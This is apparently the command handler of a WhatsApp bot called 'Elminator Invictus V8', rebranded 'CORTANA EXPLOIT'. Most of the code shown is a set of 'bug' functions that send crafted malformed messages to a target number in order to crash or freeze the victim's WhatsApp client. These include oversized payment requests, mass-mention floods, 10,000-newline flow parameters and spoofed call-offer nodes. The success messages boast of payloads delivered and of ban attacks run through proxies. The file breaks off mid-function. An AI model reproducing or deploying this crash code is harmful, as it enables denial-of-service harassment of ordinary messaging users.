/*
 Base Elminator Invictus Version 8.0 By Arul Official-ID 🐉〽️
 Tiktok : https://tiktok.com/@arul_officialll
 Telegram : https://t.me/arulofficialll
 
  ( don't delete the creator's name, please respect it!! )
  
            Kata Kata Hari Ini
      - "Seperti kata orang orang, bila kita berbuat baik pada seseorang, maka hal baik itu akan datang pada diri kita Sendiri"
      
      - "Kesuksesan berawal dari misi dan tantangan, bukan berawal dari zona nyaman"
  
      ~Arul Official-ID - 2025
*/

const config = require('../start/config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const util = require("util");
const crypto = require("crypto");
const fetch = require("node-fetch");
const moment = require("moment-timezone");
const path = require("path");
const os = require('os');
const speed = require('performance-now');
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require(path.join(__dirname, '../gudang/scraper'));
const { exec } = require('child_process');
const {
    default: baileys, proto, generateWAMessageFromContent, prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');

module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
                m.mtype === "imageMessage" ? m.message.imageMessage?.caption || "" :
                    m.mtype === "videoMessage" ? m.message.videoMessage?.caption || "" :
                        m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage?.text || "" :
                            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage?.selectedButtonId || "" :
                                m.mtype === "listResponseMessage" ? m.message.listResponseMessage?.singleSelectReply?.selectedRowId || "" :
                                    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage?.selectedId || "" :
                                        m.mtype === "interactiveResponseMessage" ? (m.msg?.nativeFlowResponseMessage?.paramsJson ?
                                            JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "" : "") :
                                            m.mtype === "messageContextInfo" ? (m.message.buttonsResponseMessage?.selectedButtonId ||
                                                m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text || "") : ""
        ) || "";

        const sender = m.key.fromMe ?
            (aruloffcx.user?.id?.split(":")[0] || aruloffcx.user?.id) + "@s.whatsapp.net" || aruloffcx.user?.id :
            m.key.participant || m.key.remoteJid;

        const senderNumber = sender?.split('@')[0] || "";
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from?.endsWith("@g.us") || false;
        const botNumber = aruloffcx.decodeJid ? await aruloffcx.decodeJid(aruloffcx.user?.id || "") : aruloffcx.user?.id || "";
        const isBot = botNumber.includes(senderNumber);

        // Group Functions
        const groupMetadata = isGroup ? await aruloffcx.groupMetadata(m.chat).catch((e) => { }) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = args.join(" ");
        const q = text;
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        let premium, reseler, creator = [];
        try {
            premium = JSON.parse(fs.readFileSync(path.join(__dirname, "./gudang/database/premium.json")));
            reseler = JSON.parse(fs.readFileSync(path.join(__dirname, "./gudang/database/reseler.json")));
            creator = JSON.parse(fs.readFileSync(path.join(__dirname, './gudang/database/owner.json')));
        } catch (e) {
            premium = [];
            reseler = [];
            creator = [];
        }

        const isPremium = premium.includes(m.sender);
        const isReseler = reseler.includes(m.sender);
        const isCreator = [botNumber, ...creator, ...(config.owner || [])]
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(m.sender);

        // Helper functions
        function formatSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function getpremiumPosition(jid, premiumList) {
            return premiumList.findIndex(item => item === jid);
        }

        const { smsg, fetchJson, sleep, formatSize: formatSizeFunc, runtime } = require(path.join(__dirname, '../gudang/myfunction'));
        const formatSizeLocal = formatSizeFunc || formatSize;

        let cihuy, Memek;
        try {
            cihuy = fs.readFileSync(path.join(__dirname, '../gudang/image/arulll.jpg'));
            Memek = fs.readFileSync(path.join(__dirname, "../gudang/image/arulll.jpg"));
        } catch (e) {
            cihuy = Buffer.from('');
            Memek = Buffer.from('');
        }

        const { fquoted } = require(path.join(__dirname, '../gudang/fquoted'));

        if (isBot) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#ff007f").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `  ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `  ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `  ⌬ Pengirim: ${pushname} \n` +
                    `  ⌬ JID: ${senderNumber}`
                )
            );

            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `  ⌬ Group: ${groupName} \n` +
                        `  ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }

        const reaction = async (jidss, emoji) => {
            await aruloffcx.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key
                }
            });
        };

        const Reply = async (teks, options = {}) => {
            try {
                await aruloffcx.sendMessage(
                    from,
                    {
                        text: teks,
                        contextInfo: {
                            externalAdReply: {
                                title: '𝐄𝐋𝐌𝐈𝐍𝐀𝐓𝚯𝐑 𝐕𝟖 𝐕𝐈𝐏',
                                body: 'Telegram: @arulofficialll',
                                previewType: 'PHOTO',
                                thumbnailUrl: 'https://files.catbox.moe/rbefof.jpg'
                            }
                        }
                    },
                    { quoted: qchannel });

            } catch (error) {
                console.error('Error sending reply:', error);
            }
        };

        const qchannel = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `120363422715901137@newsletter`,
                    newsletterName: `𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃͡`,
                    jpegThumbnail: "",
                    caption: `YT: ArulOfficial-ID`,
                    inviteExpiration: 0
                }
            }
        };

        const qkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(botNumber ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃͡`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285814233961:6285814233961\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    sendEphemeral: true
                }
            }
        };

        const example = (text) => {
            return `— example: ${prefix + command} ${text}`;
        };

        const ftoko = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                remoteJid: m.chat ? "status@broadcast" : "0@s.whatsapp.net",
            },
            message: {
                productMessage: {
                    product: {
                        title: `𝐄͜𝐋͡𝐌͢𝐈͜𝐍͡𝐀͢𝐓͜𝐎͡𝐑 𝐈͜𝐍͡𝐕͢𝐈͜𝐂͡𝐓͢𝐔͜𝐒`,
                        description: `${pushname} order`,
                        currencyCode: "IDR",
                        priceAmount1000: "999999",
                        retailerId: `Telegram: @arulofficialll`,
                        productImageCount: 1,
                    },
                    businessOwnerJid: `0@s.whatsapp.net`,
                },
            },
        };

        const hw = {
            key: {
                participant: '6285814233961@s.whatsapp.net',
                ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
            },
            message: {
                liveLocationMessage: {
                    caption: `υρтιмє : ${runtime(process.uptime())}`,
                    jpegThumbnail: ''
                }
            }
        };

        const stc = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast"
            },
            message: {
                groupInviteMessage: {
                    groupJid: "@120363321780343299@g.us",
                    inviteCode: "R4nD0mC0de",
                    groupName: "𝐀𝐫𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                    caption: "⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟",
                    jpegThumbnail: null
                }
            },
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        };

        async function zreply(teks) {
            // Simple text reply with CORTANA verified badge
            return await aruloffcx.sendMessage(m.chat, {
                text: `☠️ *CORTANA EXPLOIT*\n━━━━━━━━━━━━\n${teks}\n\n📲 t.me/eduqariz | © 2026`,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363317388829921@newsletter",
                        newsletterName: "☠️ CORTANA EXPLOIT",
                        serverMessageId: 143
                    }
                }
            });
        }

        // ═══════ CORTANA SUCCESS MESSAGES ═══════
        const cortanaExploitSuccess = async (target, cmdUsed) => {
            const successMsg = `╔══════════════════════╗
║  ☠️ 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐄̸͜𝐗̸͜𝐏̸͜𝐋̸͜𝐎̸͜𝐈̸͜𝐓̸͜ ☠️  ║
╠══════════════════════╣
║ 💀 𝐏͢𝐀͠𝐘͡𝐋͢𝐎͠𝐀͡𝐃 𝐎͢𝐕͠𝐄͡𝐑͢𝐋͠𝐎͡𝐀͢𝐃 💀
║ ✅ Successfully sent to target!
║
║ 🎯 Target: ${target}
║ ⚔️ Command: ${cmdUsed}
║
║ ⚠️ Please wait 10 min before
║ processing another request
║ or you get banned nigga! 🔥
╚══════════════════════╝
📲 t.me/eduqariz | © 2026`;

            await aruloffcx.sendMessage(m.chat, {
                text: successMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363317388829921@newsletter",
                        newsletterName: "☠️ CORTANA EXPLOIT",
                        serverMessageId: 143
                    }
                }
            });
        };

        const cortanaBanSuccess = async (target, cmdUsed) => {
            const banMsg = `╔══════════════════════╗
║  🦠 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐁̸͜𝐀̸͜𝐍̸͜ 🦠  ║
╠══════════════════════╣
║ 🔥 Oh! oo, Cortana is attacking
║ using proxies on your target!
║
║ 🎯 Target: ${target}
║ ⚔️ Method: ${cmdUsed}
║
║ ⏳ Wait for some hours, I'll
║ notify you with progress and
║ action taken!
║
║ 💬 Got questions? Reach out:
║ 📲 t.me/eduqariz
╚══════════════════════╝
☠️ CORTANA EXPLOIT | © 2026`;

            await aruloffcx.sendMessage(m.chat, {
                text: banMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363317388829921@newsletter",
                        newsletterName: "☠️ CORTANA EXPLOIT",
                        serverMessageId: 143
                    }
                }
            });
        };
        // ═══════ END CORTANA MESSAGES ═══════

        const dbPath = path.join(__dirname, '../gudang/database/antilinkgc.json');
        let ntlinkgc = fs.existsSync(dbPath)
            ? JSON.parse(fs.readFileSync(dbPath))
            : [];

        const Antilinkgc = ntlinkgc.includes(m.chat);

        if (isGroup && Antilinkgc) {
            const detect = "chat.whatsapp.com/";

            if (budy && budy.includes(detect)) {
                if (isAdmins || isCreator) return;
                if (!isBotAdmins) return zreply('*this command is for bot admin only*');

                await aruloffcx.sendMessage(m.chat, { delete: m.key });
                await aruloffcx.groupParticipantsUpdate(m.chat, [m.sender], 'remove');

                zreply(`⚠️ Link grup terdeteksi!\nPesan dihapus dan user telah dikeluarkan.`);
            }
        }

        //=============== ( ALL FUNCTION BUG ) ====================//
        // Function Forcelose
        async function FcOneMesYgy(sock, target) {
            const PayCrash = {
                requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    requestFrom: target,
                    expiryTimestamp: Date.now() + 8000,
                    amount: 1,
                    contextInfo: {
                        externalAdReply: {
                            title: "Pou Exposed",
                            body: "ြ".repeat(1500),
                            mimetype: 'audio/mpeg',
                            caption: "ြ".repeat(1500),
                            showAdAttribution: true,
                            sourceUrl: 'https://t.me/PouSkibudi',
                            thumbnailUrl: 'https://files.catbox.moe/2zlknq.jpg'
                        }
                    }
                }
            };

            await sock.relayMessage(target, PayCrash, {
                participant: { jid: target },
                messageId: null,
                userJid: target, quoted: null
            });
        }
        async function ElmiForceV1(sock, target) {
            const {
                encodeSignedDeviceIdentity,
                jidEncode,
                jidDecode,
                encodeWAMessage,
                patchMessageBeforeSending,
                encodeNewsletterMessage
            } = require("@whiskeysockets/baileys");

            let devices = (
                await sock.getUSyncDevices([target], false, false)
            ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

            await sock.assertSessions(devices);

            let xnxx = () => {
                let map = {};
                return {
                    mutex(key, fn) {
                        map[key] ??= { task: Promise.resolve() };
                        map[key].task = (async prev => {
                            try { await prev; } catch { }
                            return fn();
                        })(map[key].task);
                        return map[key].task;
                    }
                };
            };

            let Raza = xnxx();
            let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
            let XMods = sock.createParticipantNodes.bind(sock);
            let Cyber = sock.encodeWAMessage?.bind(sock);

            sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
                if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

                let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
                let memeg = Array.isArray(patched)
                    ? patched
                    : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

                let { id: meId, lid: meLid } = sock.authState.creds.me;
                let omak = meLid ? jidDecode(meLid)?.user : null;
                let shouldIncludeDeviceIdentity = false;

                let nodes = await Promise.all(
                    memeg.map(async ({ recipientJid: jid, message: msg }) => {
                        let { user: targetUser } = jidDecode(jid);
                        let { user: ownPnUser } = jidDecode(meId);
                        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                        let y = jid === meId || jid === meLid;

                        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                        let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

                        return Raza.mutex(jid, async () => {
                            let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                                jid,
                                data: bytes
                            });

                            if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

                            return {
                                tag: 'to',
                                attrs: { jid },
                                content: [
                                    {
                                        tag: 'enc',
                                        attrs: { v: '2', type, ...extraAttrs },
                                        content: ciphertext
                                    }
                                ]
                            };
                        });
                    })
                );

                return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
            };

            let Exo = crypto.randomBytes(32);
            let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: '0' }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: target,
                    id: sock.generateMessageTag(),
                    from: sock.user.id
                },
                content: [
                    {
                        tag: "offer",
                        attrs: {
                            "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                            "call-creator": sock.user.id
                        },
                        content: [
                            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                            {
                                tag: "video",
                                attrs: {
                                    orientation: "0",
                                    screen_width: "1920",
                                    screen_height: "1080",
                                    device_orientation: "0",
                                    enc: "vp8",
                                    dec: "vp8"
                                }
                            },
                            { tag: "net", attrs: { medium: "3" } },
                            {
                                tag: "capability",
                                attrs: { ver: "1" },
                                content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                            },
                            { tag: "encopt", attrs: { keygen: "2" } },
                            { tag: "destination", attrs: {}, content: destinations },
                            ...(shouldIncludeDeviceIdentity
                                ? [
                                    {
                                        tag: "device-identity",
                                        attrs: {},
                                        content: encodeSignedDeviceIdentity(
                                            sock.authState.creds.account,
                                            true
                                        )
                                    }
                                ]
                                : []
                            )
                        ]
                    }
                ]
            };
            await sock.sendNode(lemiting);
        }
        async function ElmiForceMsgV1(sock, target) {
            await sock.relayMessage(
                target,
                {
                    requestPaymentMessage: {
                        amount: {
                            currencyCodeIso4217: "IDR",
                            value: 50000,
                            offset: 1000
                        }
                    },

                    messageTimestamp: Math.floor(Date.now() / 1000),
                    pushName: null,
                    labels: [],

                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                        quotedMessage: {
                            conversation: null
                        },
                        externalAdReply: {
                            title: null,
                            body: null,
                            showAdAttribution: true,
                            mediaType: 1,
                            thumbnailUrl: null,
                            sourceUrl: null
                        },
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                        stanzaId: "ABCDEFG1234567890",
                        participant: target,
                        isForwarded: true,
                        forwardingScore: 726,
                        entryPointConversionSource: "call_permission_request",
                        entryPointConversionApp: "call_permission_message",
                        conversionSource: "quick_reply"
                    },

                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "DOCUMENT",
                                    id: "confirm_payment"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    header: "\n".repeat(10000),
                                    body: "\n".repeat(10000),
                                    flow_action: "navigate",
                                    flow_action_payload: {
                                        screen: "FORM_SCREEN"
                                    },
                                    flow_cta: "Grattler",
                                    flow_id: "1169834181134583",
                                    flow_message_version: "3",
                                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                })
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({
                                    text: "call_permission_message",
                                    id: "call_permission_request"
                                })
                            }
                        ]
                    }
                },
                { participant: { jid: target } }
            );
        }
        async function ElmiForceV2(sock, target) {
            const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
            let devices = (
                await sock.getUSyncDevices([target], false, false)
            ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

            await sock.assertSessions(devices)

            let xnxx = () => {
                let map = {};
                return {
                    mutex(key, fn) {
                        map[key] ??= { task: Promise.resolve() };
                        map[key].task = (async prev => {
                            try { await prev; } catch { }
                            return fn();
                        })(map[key].task);
                        return map[key].task;
                    }
                };
            };

            let memek = xnxx();
            let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
            let porno = sock.createParticipantNodes.bind(sock);
            let yntkts = sock.encodeWAMessage?.bind(sock);

            sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
                if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

                let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
                let ywdh = Array.isArray(patched)
                    ? patched
                    : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

                let { id: meId, lid: meLid } = sock.authState.creds.me;
                let omak = meLid ? jidDecode(meLid)?.user : null;
                let shouldIncludeDeviceIdentity = false;

                let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                    let { user: targetUser } = jidDecode(jid);
                    let { user: ownPnUser } = jidDecode(meId);
                    let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                    let y = jid === meId || jid === meLid;
                    if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                    let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                    return memek.mutex(jid, async () => {
                        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                        return {
                            tag: 'to',
                            attrs: { jid },
                            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                        };
                    });
                }));

                return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
            };

            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
            let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

            let lemiting = {
                tag: "call",
                attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        { tag: "destination", attrs: {}, content: destinations },
                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };
            await sock.sendNode(lemiting);
        }
        async function ElmiForceSpam(sock, target) {

            const {
                encodeSignedDeviceIdentity,
                jidEncode,
                jidDecode,
                encodeWAMessage,
                patchMessageBeforeSending,
                encodeNewsletterMessage
            } = require("@whiskeysockets/baileys");

            let devices = (
                await sock.getUSyncDevices([target], false, false)
            ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

            await sock.assertSessions(devices);

            let xnxx = () => {
                let map = {};
                return {
                    mutex(key, fn) {
                        map[key] ??= { task: Promise.resolve() };
                        map[key].task = (async prev => {
                            try { await prev; } catch { }
                            return fn();
                        })(map[key].task);
                        return map[key].task;
                    }
                };
            };

            let memek = xnxx();
            let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
            let porno = sock.createParticipantNodes.bind(
                sock);
            let yntkts = sock.encodeWAMessage?.bind(sock);

            sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
                if (!recipientJids.length)
                    return { nodes: [], shouldIncludeDeviceIdentity: false };

                let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
                let ywdh = Array.isArray(patched)
                    ? patched
                    : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

                let { id: meId, lid: meLid } = sock.authState.creds.me;
                let omak = meLid ? jidDecode(meLid)?.user : null;
                let shouldIncludeDeviceIdentity = false;

                let nodes = await Promise.all(
                    ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                        let { user: targetUser } = jidDecode(jid);
                        let { user: ownPnUser } = jidDecode(meId);

                        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                        let y = jid === meId || jid === meLid;

                        if (dsmMessage && isOwnUser && !y)
                            msg = dsmMessage;

                        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                        return memek.mutex(jid, async () => {
                            let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                                jid,
                                data: bytes
                            });

                            if (type === 'pkmsg')
                                shouldIncludeDeviceIdentity = true;

                            return {
                                tag: 'to',
                                attrs: { jid },
                                content: [{
                                    tag: 'enc',
                                    attrs: { v: '2', type, ...extraAttrs },
                                    content: ciphertext
                                }]
                            };
                        });
                    })
                );

                return {
                    nodes: nodes.filter(Boolean),
                    shouldIncludeDeviceIdentity
                };
            };

            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: '0' }
            );

            let expensionNode = {
                tag: "call",
                attrs: {
                    to: target,
                    id: sock.generateMessageTag(),
                    from: sock.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        { tag: "destination", attrs: {}, content: destinations },
                        ...(shouldIncludeDeviceIdentity
                            ? [{
                                tag: "device-identity",
                                attrs: {},
                                content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                            }]
                            : []
                        )
                    ]
                }]
            };

            let ZayCoreX = {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            supportPayload: JSON.stringify({
                                version: 3,
                                is_ai_message: true,
                                should_show_system_message: true,
                                ticket_id: crypto.randomBytes(16)
                            })
                        },
                        interactiveMessage: {
                            body: {
                                text: '</⃟༑𝐄͢𝐥͡𝐦͢𝐢͡𝐧͢𝐭͡𝐨͢𝐫 𝐈͢𝐧͡𝐯͢𝐢͡𝐜͢𝐭͡𝐮͢𝐬 𝐕͢𝟔🌹</⃟༑'
                            },
                            footer: {
                                text: '</⃟༑𝐄͢𝐥͡𝐦͢𝐢͡𝐧͢𝐭͡𝐨͢𝐫 𝐈͢𝐧͡𝐯͢𝐢͡𝐜͢𝐭͡𝐮͢𝐬 𝐕͢𝟔🌹</⃟༑'
                            },
                            carouselMessage: {
                                messageVersion: 1,
                                cards: [{
                                    header: {
                                        stickerMessage: {
                                            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                            mimetype: "image/webp",
                                            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                            fileLength: { low: 1, high: 0, unsigned: true },
                                            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                            firstFrameLength: 19904,
                                            firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                            isAnimated: true,
                                            isAvatar: false,
                                            isAiSticker: false,
                                            isLottie: false,
                                            contextInfo: {
                                                mentionedJid: target,
                                            }
                                        },
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: '</⃟༑𝐄͢𝐥͡𝐦͢𝐢͡𝐧͢𝐭͡𝐨͢𝐫 𝐈͢𝐧͡𝐯͢𝐢͡𝐜͢𝐭͡𝐮͢𝐬 𝐕͢𝟔🌹</⃟༑'
                                    },
                                    footer: {
                                        text: '</⃟༑𝐄͢𝐥͡𝐦͢𝐢͡𝐧͢𝐭͡𝐨͢𝐫 𝐈͢𝐧͡𝐯͢𝐢͡𝐜͢𝐭͡𝐮͢𝐬 𝐕͢𝟔🌹</⃟༑'
                                    },
                                    nativeFlowMessage: {
                                        messageParamsJson: "\n".repeat(10000)
                                    },
                                    contextInfo: {
                                        id: sock.generateMessageTag(),
                                        forwardingScore: 999,
                                        isForwarding: true,
                                        participant: "0@s.whatsapp.net",
                                        remoteJid: "X",
                                        mentionedJid: ["0@s.whatsapp.net"]
                                    }
                                }]
                            }
                        }
                    }
                }
            };

            await sock.relayMessage(target, ZayCoreX, {
                messageId: null,
                participant: { jid: target },
                userJid: target,
            });

            await sock.sendNode(expensionNode);
        }
        //============ ( BATAS FUNCTION FORCELOSE ) =================//
        //Function Delay Invisible
        async function TrueNull(sock, target) {
            const module = {
                message: {
                    ephemeralMessage: {
                        message: {
                            audioMessage: {
